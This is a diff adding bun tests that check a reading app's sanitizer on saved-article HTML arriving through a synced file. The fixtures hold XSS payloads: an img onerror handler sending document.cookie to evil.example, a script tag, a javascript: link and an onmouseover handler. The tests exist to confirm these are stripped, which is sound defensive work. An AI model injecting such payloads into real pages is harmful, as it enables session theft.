@@ -7,6 +7,9 @@
 // Run: bun test.
 
 import { expect, test } from "bun:test";
+// parseSavedArticles sanitizes on read, and the sanitizer parses with a
+// DOMParser that bun does not have.
+import "../support/dom-parser";
 import {
   buildSavedArticle,
   formatPublishedAt,
@@ -19,6 +22,7 @@ import {
   type SavedArticleInput,
 } from "../../src/reading/saved-articles";
 import { toSavedArticleInput } from "../../src/ui/components/info/saveArticle";
+import { articleHtmlForWebview, rewriteImageSrcs } from "../../src/platform/app/image-proxy";
 
 function input(over: Partial<SavedArticleInput> = {}): SavedArticleInput {
   return {
@@ -175,6 +179,125 @@ test("parseSavedArticles drops entries without an identity and survives garbage"
   expect(parseSavedArticles(text).map((a) => a.id)).toEqual([good.id]);
   expect(parseSavedArticles("not json")).toEqual([]);
   expect(parseSavedArticles('{"articles":[]}')).toEqual([]);
+});
+
+// saved-articles.json sits in the synced folder and merges record by record, so
+// a record can reach this device without ever having gone through saveArticle:
+// a shared folder, a second device, the Drive account. SavedArticleView hands
+// `html` to dangerouslySetInnerHTML, so the read is the trust boundary — the
+// write-side sanitizing guards nothing against someone who writes the file.
+// This walks the whole read path, ending on the exact string the view computes.
+function hostileFile(html: string): string {
+  return JSON.stringify([
+    {
+      id: "https://example.com/a",
+      topicId: "brief",
+      url: "https://example.com/a",
+      title: "A title",
+      source: "src",
+      sourceName: "Source",
+      publishedAt: "",
+      savedAt: 1,
+      summaryOnly: false,
+      text: "",
+      html,
+    },
+  ]);
+}
+
+test("parseSavedArticles neutralizes a body that arrived over sync, not through saveArticle", () => {
+  const [article] = parseSavedArticles(
+    hostileFile(
+      `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` +
+        `<script>alert(1)</script>` +
+        `<a href="javascript:alert(2)">go</a>` +
+        `<p onmouseover=alert(3)>text</p>`,
+    ),
+  );
+  // What SavedArticleView passes to dangerouslySetInnerHTML.
+  const rendered = articleHtmlForWebview(article.html, article.url);
+  expect(rendered).not.toContain("onerror");
+  expect(rendered).not.toContain("onmouseover");
+  expect(rendered).not.toContain("<script");
+  expect(rendered).not.toContain("javascript:");
+  expect(rendered).toBe("<a>go</a><p>text</p>");
+});
+
+// data:image/svg+xml is markup, and the sanitizer keeps an inline data: image
+// when the tag holds no other usable URL — so the read strips data images too,
+// the same rule the write side applies for size.
+test("parseSavedArticles drops an inlined data: image reaching it from the file", () => {
+  const [article] = parseSavedArticles(
+    hostileFile(`<p>a</p><img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="><p>b</p>`),
+  );
+  expect(article.html).toBe("<p>a</p><p>b</p>");
+});
+
+// The read guard must not chew up an honest record: an article kept yesterday
+// renders the same today.
+test("parseSavedArticles leaves an ordinary saved body alone", () => {
+  const html = `<p>Real prose with <b>bold</b>.</p><img src="https://cdn.example/a.jpg" loading="lazy">`;
+  const [article] = parseSavedArticles(hostileFile(html));
+  expect(article.html).toBe(html);
+});
+
+// The read guard runs on every read, so a record that sanitizes to something
+// else the second time renders differently the second time. The proxy step is
+// in here because it is the one thing downstream that reads the stored src back
+// out of the source text.
+test("a stored body renders the same on its tenth read as on its first", () => {
+  const stored =
+    `<p>A &amp; B</p>` +
+    `<img src="https://cdn.example/a.jpg?w=640&amp;h=480">` +
+    `<img src="https://&amp;#101;vil.example/b.jpg">` +
+    `<a href="https://x.example/?q=1&amp;r=2">link</a>`;
+  const first = parseSavedArticles(hostileFile(stored))[0].html;
+  let body = first;
+  for (let i = 0; i < 9; i += 1) body = parseSavedArticles(hostileFile(body))[0].html;
+  expect(body).toBe(first);
+  expect(first).toContain('src="https://&amp;#101;vil.example/b.jpg"');
+
+  // And the image the proxy is asked to fetch is the URL that was stored, one
+  // "&" per separator, not the escaped text.
+  const asked: string[] = [];
+  rewriteProbe(first, asked);
+  expect(asked).toContain("https://cdn.example/a.jpg?w=640&h=480");
+  expect(asked).toContain("https://&#101;vil.example/b.jpg");
+});
+
+// Cutting the inlined image out is the one step here that is not the
+// sanitizer's own, and it can leave text where the sanitizer would have written
+// it differently: the <img> was standing between the <pre> start tag and a
+// newline the next parse eats, so the code block lost its blank first line on
+// the second read and not the first.
+test("dropping an inlined image does not leave the body to settle on a later read", () => {
+  const stored = `<pre><img src="data:image/png;base64,AAAA">\n  git log\n</pre>`;
+  const first = parseSavedArticles(hostileFile(stored))[0].html;
+  let body = first;
+  for (let i = 0; i < 9; i += 1) body = parseSavedArticles(hostileFile(body))[0].html;
+  expect(body).toBe(first);
+  // The newline was the one the tree builder eats after a <pre> start tag; with
+  // the image gone it is the first thing in the block, so it goes.
+  expect(first).toBe(`<pre>  git log\n</pre>`);
+  // A blank line the reader can see is kept, on the first read and the tenth.
+  const blank = `<pre><img src="data:image/png;base64,AAAA">\n\n  git log\n</pre>`;
+  const kept = parseSavedArticles(hostileFile(blank))[0].html;
+  expect(kept).toBe(`<pre>\n\n  git log\n</pre>`);
+  expect(parseSavedArticles(hostileFile(kept))[0].html).toBe(kept);
+});
+
+// Collects what rewriteImageSrcs hands the proxy mapper, which outside Tauri is
+// never called for real.
+function rewriteProbe(html: string, into: string[]): void {
+  rewriteImageSrcs(html, (url) => {
+    into.push(url);
+    return null;
+  });
+}
+
+test("parseSavedArticles survives a record whose html is not a string", () => {
+  const text = JSON.stringify([{ id: "x", html: 42 }, { id: "y" }]);
+  expect(parseSavedArticles(text).map((a) => a.html)).toEqual(["", ""]);
 });
 
 test("formatPublishedAt shows an unparseable date verbatim and nothing for none", () => {
